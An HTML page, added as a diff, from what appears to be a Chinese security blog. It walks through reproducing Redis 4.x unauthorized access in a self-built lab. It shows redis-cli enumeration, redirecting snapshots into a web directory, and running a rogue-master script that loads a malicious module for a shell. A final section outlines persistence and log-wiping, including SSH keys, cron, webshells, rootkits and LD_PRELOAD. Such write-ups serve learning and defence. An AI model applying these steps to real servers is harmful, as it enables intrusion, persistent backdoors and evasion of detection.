@@ -1,0 +1,426 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Redis-unacc | Qexzi&#39;s Blog</title>
+  <meta name="author" content="Qexzi">
+  
+  <meta name="description" content="1. 复现基础指令
+redis-cli -h 10.62.60.167 -p 8589   (自建靶场的ip与端口，默认是6397)ping -&amp;gt; pong 说明存在未授权keys *  打印所有的keyget mykey 测试读取set test1_key &amp;quot;This is test1_key&amp;quot; 测试写入info server 服务信息CONFIG GET dir 查询工作目录，RDB 文件、AOF 日志文件都会保存在这个目录下CONFIG GET dbfilename 查询RDB快照文件名称（内存快照）CONFIG GET rdbcompression 查询RDB快照文件是否开启压缩
+
+当前redis版本是4.0.14，是老版本了。 
+那就先做拉取数据库文件，然后本地解析
+BGSAVE 触发后台生成RDB快照，防止操作阻塞LASTSAVE 返回一个最新快照时间戳
+
+但是redis没有可供下载的地方，所以一般都是在线读信息，如果硬是要下载，就要寻在http文件下载端点，这个过程有点麻烦
+# 备份原有配置（后面必须恢复！）CONFIG GET dirCONFIG GET dbfilename# 修改保存目录（为下载端点目录）CONFIG SET dir &amp;quot;/var/www/html/....下载端点&amp;quot;CONFIG SET dbfilename &amp;quot;dump.rdb&amp;quot;# 触发快照，把rdb写入该目录BGSAVE
+
+
+所以还是利用modle进行getshell吧，攻击脚本：：https://github.com/vulhub/redis-rogue-getshell.git"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Redis-unacc"/>
+  <meta property="og:site_name" content="Qexzi&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/zhuzhuxia.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/mobile-optimized.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.1"><script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']],
+    displayMath: [['$$', '$$'], ['\\[', '\\]']],
+    processEscapes: true,
+    processEnvironments: true
+  },
+  options: {
+    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+  },
+  startup: {
+    pageReady: () => {
+      return MathJax.startup.defaultPageReady();
+    }
+  }
+};
+</script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Qexzi&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Redis-unacc</h1>
+		</div>
+	
+
+
+
+
+<!-- Reading progress bar -->
+<div class="reading-progress-bar" id="reading-progress-bar"></div>
+
+
+<div class="row post">
+		<!-- cols -->
+		
+		<div id="top_meta"></div>
+		<div class="col-md-9">
+		
+
+		<!-- content -->
+		<div class="mypage">
+		  
+		  <!-- 文章统计 -->
+		  <div class="article-stats">
+		    <i class="fa fa-file-text"></i> 字数: <span id="word-count">计算中...</span>
+		    <span style="margin-left: 12px;"><i class="fa fa-clock-o"></i> 阅读时长: <span id="reading-time">计算中...</span></span>
+		  </div>
+		  
+		  
+
+		  <h2 id="1-复现"><a href="#1-复现" class="headerlink" title="1. 复现"></a>1. 复现</h2><p>基础指令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h 10.62.60.167 -p 8589   (自建靶场的ip与端口，默认是6397)</span><br><span class="line"></span><br><span class="line">ping -&gt; pong 说明存在未授权</span><br><span class="line"></span><br><span class="line">keys *  打印所有的key</span><br><span class="line">get mykey 测试读取</span><br><span class="line"><span class="built_in">set</span> test1_key <span class="string">&quot;This is test1_key&quot;</span> 测试写入</span><br><span class="line"></span><br><span class="line">info server 服务信息</span><br><span class="line">CONFIG GET <span class="built_in">dir</span> 查询工作目录，RDB 文件、AOF 日志文件都会保存在这个目录下</span><br><span class="line">CONFIG GET dbfilename 查询RDB快照文件名称（内存快照）</span><br><span class="line">CONFIG GET rdbcompression 查询RDB快照文件是否开启压缩</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redis4-unacc/image_1.png" alt="在这里插入图片描述"><br>当前redis版本是4.0.14，是老版本了。 </p>
+<p>那就先做拉取数据库文件，然后本地解析</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BGSAVE 触发后台生成RDB快照，防止操作阻塞</span><br><span class="line">LASTSAVE 返回一个最新快照时间戳</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Redis4-unacc/image_2.png" alt="在这里插入图片描述"></p>
+<p>但是redis没有可供下载的地方，所以一般都是在线读信息，如果硬是要下载，就要寻在http文件下载端点，这个过程有点麻烦</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份原有配置（后面必须恢复！）</span></span><br><span class="line">CONFIG GET <span class="built_in">dir</span></span><br><span class="line">CONFIG GET dbfilename</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改保存目录（为下载端点目录）</span></span><br><span class="line">CONFIG SET <span class="built_in">dir</span> <span class="string">&quot;/var/www/html/....下载端点&quot;</span></span><br><span class="line">CONFIG SET dbfilename <span class="string">&quot;dump.rdb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发快照，把rdb写入该目录</span></span><br><span class="line">BGSAVE</span><br></pre></td></tr></table></figure>
+
+
+<p>所以还是利用modle进行getshell吧，攻击脚本：：<a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell.git">https://github.com/vulhub/redis-rogue-getshell.git</a></p>
+<p>先进入exp处make一下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python .\redis-master.py -r 10.62.60.167 -p 8589 -L 10.60.65.136 -P 8888 -f RedisModulesSDK/exp/exp.so -c <span class="string">&quot;ls&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/Redis4-unacc/image_3.png" alt="在这里插入图片描述"></p>
+<p><strong>攻击原理分析：</strong><br>Redis 4.x 到 5.0.5 版本存在未授权访问，攻击者不用密码就能连上 Redis。</p>
+<p>攻击者自己搭一个假的 Redis 主节点，然后在目标 Redis 上敲命令，让目标主动变成这个假节点的从库。</p>
+<p>当主从开始全量同步的时候，目标会主动连接我们的恶意服务，把对方发过来的数据当成正常 RDB 快照写到本地磁盘，但我们发过去的根本不是正常的 Redis 数据，而是恶意的 so 动态库文件。</p>
+<p>文件落盘之后，再用 MODULE LOAD 加载这个恶意模块，模块就新增了能直接调用系统命令的自定义 Redis 指令，这样我们就能在 Redis 里执行操作系统命令，拿到服务器 shell。</p>
+<p><strong>攻击脚本的分析：</strong></p>
+<p>攻击脚本主要分为两部分：</p>
+<ol>
+<li>伪造主节点，传输exp.so</li>
+<li>加载exp.so，建立反弹shell</li>
+</ol>
+<p><strong>攻击逻辑：</strong><br><img src="/images/Redis4-unacc/image_4.png" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="2-Redis-主从模式"><a href="#2-Redis-主从模式" class="headerlink" title="2. Redis 主从模式"></a>2. Redis 主从模式</h2><p>Redis 主从模式，也叫主从复制或 master-replica 复制，是指一个 Redis 实例作为主节点（master）负责处理写请求和部分读请求，一个或多个从节点（replica，早期称 slave）通过配置 <code>replicaof</code> 或启动命令连接主节点，持续接收并执行主节点传播过来的写命令，从而保持数据副本与主节点大致一致；从节点默认是只读的（<code>replica-read-only yes</code>），这样可以把读流量分散到多个从节点，实现读写分离、读扩展、数据备份和一定程度的故障恢复能力。</p>
+<p>复制建立时，从节点会向主节点发送 <code>PSYNC</code> 命令并带上自己记录的复制 ID（replid）和复制偏移量（offset），主节点若判断可以进行部分重同步，就从复制积压缓冲区（repl-backlog）中把从节点缺失的那部分命令补发过去；如果无法部分重同步，则触发全量同步：主节点 fork 一个子进程生成当前数据的 RDB 快照，同时把生成期间新收到的写命令缓存起来，然后把 RDB 发送给从节点，从节点先清空自身数据并载入 RDB，再执行缓存中的增量命令，之后进入持续的命令传播阶段，主节点每执行一条写命令就异步发给所有从节点。</p>
+<p>主从之间还会通过心跳和偏移量确认来监测连接与复制进度，网络短暂断开后如果条件满足可基于 backlog 做部分重同步，否则再次全量同步。需要注意的是，Redis 主从复制默认是异步的，因此从节点数据可能落后于主节点，主节点故障时也可能丢失最后一部分未同步的写入；主从模式本身只解决复制和读扩展，不负责自动选主和故障转移，通常要配合 Redis Sentinel 哨兵或 Redis Cluster 集群来实现高可用，由哨兵监控主从、在主观下线与客观下线判定后提升某个从节点为新主并让其他从节点复制新主；此外还可以使用级联复制让从节点再带从节点，以减轻主节点的复制压力。</p>
+<p>总体来说，主从模式是 Redis 高可用和分布式架构的基础，适合读多写少、需要冗余备份和读负载均衡的场景，但使用时必须接受异步复制带来的延迟与一致性权衡，并合理配置持久化、复制积压缓冲区、超时和只读策略。</p>
+<hr>
+<h2 id="3-Redis-哨兵模式"><a href="#3-Redis-哨兵模式" class="headerlink" title="3. Redis 哨兵模式"></a>3. Redis 哨兵模式</h2><p>Redis 哨兵模式（Redis Sentinel）是在主从复制基础上实现高可用的方案，它本身不存储业务数据，而是由一组独立的 Sentinel 进程组成，通常部署奇数个（如 3 个或 5 个）并分布在不同机器或故障域，持续监控主节点和从节点。</p>
+<p>每个 Sentinel 会定期向节点发送 PING，如果在 <code>down-after-milliseconds</code> 内没有收到有效响应，就先把该节点标记为主观下线（SDOWN）；当达到配置的 <code>quorum</code> 个 Sentinel 都认为主节点不可达时，主节点被判定为客观下线（ODOWN），随后 Sentinel 之间进行选举，选出一个领头 Sentinel 负责故障转移。</p>
+<p>领头 Sentinel 会从从节点中按优先级、复制偏移量、运行 ID 等规则挑选一个提升为新主，让其他从节点改为复制新主，并通过发布订阅机制通知客户端新的主节点地址；旧主恢复后会被降级为从节点。哨兵模式解决了主从模式不能自动选主和切换的问题，但数据复制仍是异步的，故障切换期间可能丢失少量写入，客户端也需要支持 Sentinel 或通过代理接入；它适合高可用和读写分离场景，但不等同于 Redis Cluster 的分片扩展。</p>
+<hr>
+<h2 id="4-后渗透"><a href="#4-后渗透" class="headerlink" title="4. 后渗透"></a>4. 后渗透</h2><p>拿到 Redis 未授权+主从复制 Module RCE 的反弹 shell 后，后渗透的核心思路是把 Redis 的“写文件”能力继续武器化，并结合系统层面做提权、持久化和隐藏。</p>
+<p>首先确认权限和环境：<code>id</code>、<code>whoami</code>、是否在容器、Redis 以什么用户运行、有无 Docker socket、sudo 权限、SUID 文件、可写目录等。</p>
+<p>如果 Redis 以 root 运行或容器内是 root，基本直接提权成功；否则找 SUID、sudo 配置、内核漏洞或可写服务配置提权。持久化方面，最直接的是利用 Redis 的 <code>CONFIG SET dir</code> + <code>dbfilename</code> 配合 <code>BGSAVE</code> 或主从复制下发任意文件，往 <code>/root/.ssh/authorized_keys</code> 写 SSH 公钥、往 <code>/var/spool/cron/root</code> 或 <code>/etc/cron.d/</code> 写定时任务、往 Web 目录写 webshell、往 <code>systemd</code> 目录写服务，或者直接 <code>useradd</code> 加用户并加入 sudo 组。隐藏方面，可以替换 <code>ps</code>、<code>top</code>、<code>netstat</code>、<code>ss</code> 等命令过滤关键字，清理 Redis 日志、<code>.bash_history</code>、<code>auth.log</code>、<code>wtmp/utmp</code>，把后门文件放到 <code>/dev/shm</code> 或 <code>/tmp</code> 并改名，用 bind mount 或 rootkit 隐藏文件与进程，甚至用 LD_PRELOAD 劫持系统调用。</p>
+<p>总之，Redis 未授权后渗透就是围绕“写文件”和“命令执行”两个能力，根据目标环境选择写公钥、写 cron、写 webshell、加用户或提权，最后清理痕迹并隐藏后门。</p>
+
+		  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+
+		  <script>
+		    // 计算字数与阅读时长，同时更新阅读进度条
+		    (function() {
+		      var content = document.querySelector('.mypage');
+		      if (content) {
+		        var text = content.innerText || content.textContent;
+		        // 中文字符（含 CJK 扩展区 + 标点），按字符计数
+		        var chineseChars = (text.match(/[一-鿿㐀-䶿豈-﫿　-〿＀-￯]/g) || []).length;
+		        // 英文/数字按字符计（非词），与 CSDN 统计方式一致
+		        var latinChars = (text.match(/[a-zA-Z0-9]/g) || []).length;
+		        var wordCount = chineseChars + latinChars;
+		        // 阅读时长：中文约 300 字/分钟，英文约 200 词/分钟
+		        var englishWords = (text.match(/[a-zA-Z0-9]+/g) || []).length;
+		        var readingTime = Math.max(1, Math.ceil(chineseChars / 300 + englishWords / 200));
+		        var wcEl = document.getElementById('word-count');
+		        var rtEl = document.getElementById('reading-time');
+		        if (wcEl) wcEl.textContent = '~' + wordCount + ' 字';
+		        if (rtEl) rtEl.textContent = '约 ' + readingTime + ' 分钟';
+		      }
+		      // 阅读进度条
+		      var bar = document.getElementById('reading-progress-bar');
+		      if (bar) {
+		        window.addEventListener('scroll', function() {
+		          var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+		          var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+		          var progress = docHeight > 0 ? Math.min(100, (scrollTop / docHeight) * 100) : 0;
+		          bar.style.width = progress + '%';
+		        });
+		      }
+		    })();
+		  </script>
+		</div>
+
+		
+		<div>
+	  	<center>
+
+		<div class="pagination">
+
+    
+    
+    <a href="/2026/07/16/XXE基础/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2026/06/07/HookScripts/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+	    </center>
+		</div>
+
+		<!-- comment -->
+	
+		
+		</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+		<div id="side_meta">
+			<div class="col-md-3 sticky-meta" id="post_meta"> 
+
+	<!-- small fixed card (date + brief meta) -->
+	<div class="top-card">
+		<!-- date -->
+		
+		<div class="meta-widget">
+		<i class="fa fa-clock-o"></i>
+		2026-06-08
+		</div>
+		
+
+		<!-- brief categories/tags inside fixed card -->
+		
+		<div class="meta-widget small-cats">
+			<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>
+			<ul id="categorys" class="tag_box list-unstyled collapse in">
+				  
+  <li>
+    <li><a href="/categories/网络安全/">网络安全<span>47</span></a></li> <li><a href="/categories/网络安全/漏洞/">漏洞<span>15</span></a></li> <li><a href="/categories/网络安全/漏洞/复现/">复现<span>2</span></a></li>
+  </li>
+
+			</ul>
+		</div>
+		
+
+		
+		<div class="meta-widget small-tags">
+			<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>
+			<ul id="tags" class="tag_box list-unstyled collapse in">
+				  
+  <li><a href="/tags/Redis/">Redis<span>1</span></a></li>
+			</ul>
+		</div>
+		
+	</div>
+
+	<!-- All Categories: sticky within sidebar area -->
+	<div class="category-stick" id="category-stick">
+		
+<div class="widget-wrap">
+  <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
+  <div class="widget category-tree">
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/AI/">AI</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/AI/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a><span class="hacker-category-list-count">2</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/">CTF</a><span class="hacker-category-list-count">3</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">3</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/Misc/">Misc</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">43</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC/">SRC</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">19</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">6</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F-%E6%94%BB%E9%98%B2/">渗透&&攻防</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F-%E6%94%BB%E9%98%B2/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F-%E6%94%BB%E9%98%B2/%E7%BA%A2%E9%98%9F/">红队</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">15</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB/">WEB</a><span class="hacker-category-list-count">10</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB/Top10/">Top10</a><span class="hacker-category-list-count">10</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">2</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+  </div>
+</div>
+
+
+<style>
+/* Hacker / Terminal Style Category Tree */
+.category-tree .hacker-category-list {
+  padding-left: 20px;
+  font-family: 'Consolas', 'Courier New', monospace;
+  color: #fff;
+  list-style-type: circle; /* 'o' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list {
+  list-style-type: square; /* '■' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list .hacker-category-list {
+  list-style-type: square;
+}
+
+.category-tree .hacker-category-list-item {
+  margin: 6px 0;
+}
+
+.category-tree .hacker-category-list-link {
+  background-color: rgba(43, 188, 138, 0.1);
+  color: #2bbc8a;
+  text-decoration: none;
+  padding: 1px 6px;
+  font-weight: bold;
+  display: inline-block;
+}
+
+.category-tree .hacker-category-list-link:hover {
+  background-color: rgba(43, 188, 138, 0.2);
+  text-decoration: none;
+}
+
+.category-tree .hacker-category-list-count {
+  color: #2bbc8a;
+  margin-left: 5px;
+}
+</style>
+
+	</div>
+
+	<!-- article TOC placed below the category list; should scroll with page -->
+	<div class="toc-wrapper">
+		<div class="toc-widget">
+		
+			 <div class="toc">
+				 <span class="toc-title"><i class="fa fa-list"></i> Contents</span>
+				<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1-%E5%A4%8D%E7%8E%B0"><span class="toc-article-text">1. 复现</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2-Redis-%E4%B8%BB%E4%BB%8E%E6%A8%A1%E5%BC%8F"><span class="toc-article-text">2. Redis 主从模式</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3-Redis-%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F"><span class="toc-article-text">3. Redis 哨兵模式</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4-%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-article-text">4. 后渗透</span></a></li></ol>
+			</div>
+		
+		</div>
+	</div>
+
+</div><!-- col-md-3 -->
+
+
+		</div>
+
+		
+
+	</div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 Qexzi's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/toc.js"></script>
+<script src="/js/copy-code.js"></script>
+
+   <script type="text/javascript">
+     var searchPath = "/search.xml";
+   </script>
+
+
+<script src="/js/search.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+</body>
+   </html>
